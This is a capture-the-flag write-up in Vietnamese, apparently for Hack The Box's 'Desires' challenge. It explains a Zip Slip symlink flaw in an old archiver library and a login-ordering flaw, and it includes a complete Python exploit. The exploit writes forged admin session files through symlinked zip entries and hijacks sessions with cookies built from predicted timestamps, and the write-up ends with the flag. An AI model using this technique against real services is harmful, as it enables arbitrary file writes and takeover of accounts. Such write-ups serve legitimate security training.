---
title: Phân tích source

---

![image](https://hackmd.io/_uploads/SyWNI1OrWx.png)


# Phân tích source
## Main
- 2 thành phần chính chạy trên Docker:
    - **Service (Golang - Port 1337)**: Xử lý logic chính (upload, session, giao diện)
    - **SSO (NodeJS - Port 8080)**: Xử lý đăng ký/đăng nhập, cơ sở dữ liệu user

- Mục tiêu: đọc nội dung file flag tại `/user/admin`. Endpoint này yêu cầu user phải có `role: "admin"`.
## File `web_desires/challenge/service/go.mod` 
- Đoạn code: `github.com/mholt/archiver/v3 v3.5.0`
- Đây là một phiên bản cũ của thư viện `archiver`. Thư viện này nổi tiếng với lỗ hổng **Zip Slip**, đặc biêt là với Symlink(Liên kết mềm) cho phép ghi file ra ngoài thư mục đích

## File `services/http.go`
- Hàm `UploadEngima`: 
    - Đoạn code:     
    ```java
    // Giải nén file zip người dùng upload vào thư mục userFolder
    err = archiver.Unarchive(tempFile, userFolder)
    ```
    - Server nhận file nén từ user
    - Gọi thẳng hàm `Unarchive` để giải nén vào `app/service/files/<username>`
    - Không có dòng code nào kiểm tra xem file bên trong file nén có chứa đường dẫn độc hại(như `../`) hay không trước khi giải nén. Hoàn toàn tin tưởng vào thư viện `archiver` (bản cũ)

- Hàm `LoginHandler`:
    1. Tạo Session ID:
    ```java!
    sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(strconv.FormatInt(time.Now().Unix(), 10))))
    ```
    => ID được tạo dựa trên thời gian thực (Unix Timestamp)
    2. Lưu vào redis (pre-auth)
    ```java!
    err := PrepareSession(sessionID, credentials.Username)
    ```
    => Lưu mapping `username -> sessionID` vào redis trước khi kiểm tra mật khẩu
    3. Kiểm tra password:
    ```java!
    user, err := loginUser(credentials.Username, credentials.Password)
    if err != nil {
        return utils.ErrorResponse(c, "Invalid username or Password", http.StatusBadRequest)
    }
    ```
    => Nếu sai password, hàm trả về lỗi ngay tại đây
    4. Ghi file Session (post-auth)
    ```java!
    sessId := CreateSession(sessionID, user)
    ```
    => Chỉ khi đúng mật khẩu, server mới tạo file session trên đĩa
    
# Vuln
## Zip Slip via Symlink (CVE-2024-0406 variant)
- Sử dụng thư viện `archiver v3.5.0` không an toàn và thiếu validate đầu vào
- Từ đó có thể tạo một file Zip chứa:
    - Entry 1: một symlink trỏ ra thư mục gốc (VD: `link -> /tmp/sessions`)
    - Entry 2: một file nằm trong folder symlink đó (VD: `link/malicious-file`)
- Khi giải nén server sẽ ghi `malicious-file`  vào `/tmp/sessions/` thay vì thư mực upload quy định => **Arbitrary File Write**

## Logic flaw 
- Thứ tự thực hiện logic đăng nhập bị sai: **Lưu redis -> check pass -> ghi file**
    - Khi user gửi request login, redis được cập nhật `sessionID` mới ngay 
    - Nếu mật khẩu sai thì quá trình dừng lại, nhưng redis không bị rollback (tức là không bị xoá key vừa tạo)
    - Ở đây thì redis trỏ tới một `sessionID` mà file session tương ứng trên đĩa chưa được tạo ra bởi server
=> Phía tấn công có thể tự tạo file session đó (bằng lỗ hổng Zip Slip ở trên) thì có thể chiếm quyền điều khiển phiên

# Exploit
## Bước 1: dự đoán session ID 
- Do Session ID dựa trên `time.Now().Unix()`, việc lệch thời gian giữa máy tấn công và server sẽ khiến exploit thất bại.
    - Gửi request `HEAD` tới server để lấy header `Date`
    - Tính độ lệch  = `Server Time` - `Local Time`
    - Điều chỉnh thời gian tấn công dựa trên độ lệch này
## Bước 2: Chuẩn bị payload tương lai
- Tạo file session cho 120 giây tiếp theo (`payload_duration = 120`)
- Tạo một file zip đặc biệt để khai thác Zip Slip
  1. Symlink attack: `sess_xxx` -> `../../../../tmp/sessions/{USERNAME}`. Dùng để trỏ vào thư mục session của user

  2. Symlink verify: `chk` -> `../../static`. Dùng để kiểm tra xem lỗi Zip Slip có hoạt động không

  3. File Session: Ghi file JSON `{"username": USERNAME, "id": 1337, "role": "admin"}` vào đường dẫn `sess_xxx/{SESSION_ID}`

  4. File Verify: Ghi file `pwn_{user}.txt` vào `chk/` để kiểm tra.
    
## Bước 3: Upload payload
- Server giải nén (do lỗi Zip Slip) và sẽ ghi hàng loạt file session admin vào thư mục `/tmp/sessions/{USERNAME}/` tương ứng với các giây trong tương lai.
- Kiểm tra`/static/pwn_{user}.txt` để chắc chắn quyền ghi file hoạt động

## Bước 4: Trigger
- Thời điểm: chờ đến khi thời gian server trôi vào vùng phủ sóng của payload (sau khoảng 15s).
- Script spam request Login liên tục trong 30 giây
- Payload: `{ "username": ..., "password": "WRONG_PASS" }`
- Vì sao SAI pass?
    - Server tạo ID theo thời gian thực (trùng với 1 file ta đã upload)
    - Server lưu mapping `User -> ID` vào redis.
    - Server thấy sai pass -> **dừng lại**. File session admin trên đĩa **KHÔNG** bị ghi đè bởi session user thường

=> Redis trỏ vào ID của héc cơ, và file trên đĩa là file của héc cơ.

## Bước 5: Chiếm quyền
- Script lặp qua tất cả các Session ID đã tạo trong cửa sổ thời gian.
- Set cookie `session=<POSSIBLE_ID>`
- Truy cập `/user/admin`
- Nếu trúng ID mà server đã lưu vào redis ở Bước 4 -> Server đọc file session admin -> Trả về **FLAG**


# Full script exploit:
```python!
import requests
import zipfile
import io
import json
import hashlib
import time
import uuid
import email.utils
from datetime import datetime

# ================= CONFIGURATION =================
TARGET_IP = "94.237.61.52"
TARGET_PORT = "30394"
TARGET_URL = f"http://{TARGET_IP}:{TARGET_PORT}"
# Tạo username ngẫu nhiên để tránh xung đột với các lần chạy trước
USERNAME = f"pwn_v3_{uuid.uuid4().hex[:6]}" 
PASSWORD = "password123"
# =================================================

def get_session_id(timestamp):
    # Logic giống hệt server Go: SHA256 của Unix timestamp
    return hashlib.sha256(str(timestamp).encode()).hexdigest()

def get_server_time(session):
    """Lấy thời gian server từ Header Date để tính Drift"""
    try:
        r = session.head(TARGET_URL, timeout=5)
        if 'Date' in r.headers:
            server_date = email.utils.parsedate_to_datetime(r.headers['Date'])
            return int(server_date.timestamp())
    except Exception as e:
        print(f"[!] Warning: Could not get server time ({e}). Using local time.")
    return int(time.time())

def pwn():
    s = requests.Session()
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] User:   {USERNAME}")

    # 1. SETUP: Register & Login
    # Bước này tạo thư mục /app/service/files/<username>
    print("[1] Setting up account...")
    try:
        s.post(f"{TARGET_URL}/register", json={"username": USERNAME, "password": PASSWORD})
        r = s.post(f"{TARGET_URL}/login", json={"username": USERNAME, "password": PASSWORD})
        if 'session' not in s.cookies:
            print("[-] Login failed. Exiting.")
            return
    except Exception as e:
        print(f"[-] Network error: {e}")
        return

    # 2. SYNC: Tính toán thời gian
    print("[2] Syncing time...")
    server_now = get_server_time(s)
    local_now = int(time.time())
    drift = server_now - local_now
    print(f"    Server Time: {server_now}")
    print(f"    Drift:       {drift}s")

    # Chiến thuật: 
    # - Upload payload cho khoảng thời gian: T+10 đến T+130 (120s)
    # - Spam login trong khoảng: T+15 đến T+45 (30s)
    # => Đảm bảo request cuối cùng LUÔN nằm trong vùng có file.
    
    start_offset = 15
    payload_duration = 120 # Tạo file cho 2 phút tương lai
    attack_duration = 30   # Chỉ tấn công trong 30s
    
    start_ts = server_now + start_offset
    end_payload_ts = start_ts + payload_duration
    end_attack_ts = start_ts + attack_duration

    print(f"[3] Crafting Payload (Coverage: {payload_duration}s)...")
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        # A. Symlink Zip Slip -> /tmp/sessions/<user>
        symlink_name = f"sess_{uuid.uuid4().hex[:6]}"
        # ../../../.. để thoát khỏi /app/service/files/<user> ra root
        zf.writestr(zipfile.ZipInfo(symlink_name), f"../../../../tmp/sessions/{USERNAME}")
        zf.getinfo(symlink_name).create_system = 3
        zf.getinfo(symlink_name).external_attr = 0xA1ED0000

        # B. Symlink Check -> /app/service/static
        # Dùng để verify xem Zip Slip có hoạt động không
        check_link = "chk"
        zf.writestr(zipfile.ZipInfo(check_link), f"../../static")
        zf.getinfo(check_link).create_system = 3
        zf.getinfo(check_link).external_attr = 0xA1ED0000
        
        # C. Payload Files
        admin_json = json.dumps({"username": USERNAME, "id": 1337, "role": "admin"})
        
        # Tạo file session cho toàn bộ cửa sổ 120s
        for t in range(start_ts, end_payload_ts + 1):
            sid = get_session_id(t)
            zf.writestr(f"{symlink_name}/{sid}", admin_json)
            
        # File verify
        zf.writestr(f"{check_link}/pwn_{USERNAME}.txt", "ZIP_SLIP_WORKS")

    zip_buffer.seek(0)

    # 3. UPLOAD
    print("[4] Uploading Payload...")
    files = {'archive': ('exploit.zip', zip_buffer, 'application/zip')}
    r = s.post(f"{TARGET_URL}/user/upload", files=files, timeout=10)
    if r.status_code != 202:
        print(f"[-] Upload failed: {r.status_code} {r.text}")
        return
    print("[+] Upload successful.")

    # 4. VERIFY ZIP SLIP
    # Kiểm tra xem file pwn.txt có được ghi vào static folder không
    print("[5] Verifying Zip Slip vulnerability...")
    try:
        check_r = s.get(f"{TARGET_URL}/static/pwn_{USERNAME}.txt")
        if check_r.status_code == 200 and "ZIP_SLIP_WORKS" in check_r.text:
            print("[+] VULN CONFIRMED: Arbitrary File Write works!")
        else:
            print("[-] WARNING: Could not verify file write. Path might be wrong or permissions denied.")
            # Vẫn tiếp tục thử tấn công vì có thể folder session ghi được còn static thì không
    except:
        pass

    # 5. ATTACK (TRIGGER LOGIN)
    # Chờ đến giờ G
    wait_time = start_ts - get_server_time(s)
    if wait_time > 0:
        print(f"[*] Waiting {wait_time}s for attack window...")
        time.sleep(wait_time)
    
    print(f"[*] SPAMMING Login (Duration: {attack_duration}s)...")
    
    # Dùng session phụ để spam login
    attacker_session = requests.Session()
    stop_time = time.time() + attack_duration
    req_count = 0
    
    while time.time() < stop_time:
        try:
            # Gửi login với pass SAI
            attacker_session.post(f"{TARGET_URL}/login", 
                                json={"username": USERNAME, "password": "WRONG_PASS"}, 
                                timeout=1)
            req_count += 1
            # Ngủ ngắn để tránh DDOS self-dos
            time.sleep(0.5)
        except:
            pass
            
    print(f"[*] Spam finished. Sent {req_count} requests.")
    print("[*] Checking for Flag in the debris...")

    # 6. CHECK FLAG
    # Kiểm tra tất cả các ID trong khoảng payload (vì ta không biết request cuối cùng rơi vào giây nào)
    found = False
    for t in range(start_ts, end_payload_ts + 1):
        sid = get_session_id(t)
        
        # Forge cookie
        s.cookies.set("session", sid, domain=TARGET_IP)
        s.cookies.set("username", USERNAME, domain=TARGET_IP)
        
        try:
            res = s.get(f"{TARGET_URL}/user/admin", timeout=2)
            if "HTB{" in res.text:
                print("\n" + "="*50)
                print(" [!!!] FLAG FOUND [!!!]")
                print(" " + res.text.strip())
                print("="*50 + "\n")
                found = True
                break
        except:
            continue

    if not found:
        print("[-] Flag still not found. Try running again immediately.")

if __name__ == "__main__":
    pwn()
```

---
# Challenge url: https://app.hackthebox.com/challenges/Desires

#### FLAG: HTB{S0m3tIm3s_Its_J4usT_A_B!G_M3ss}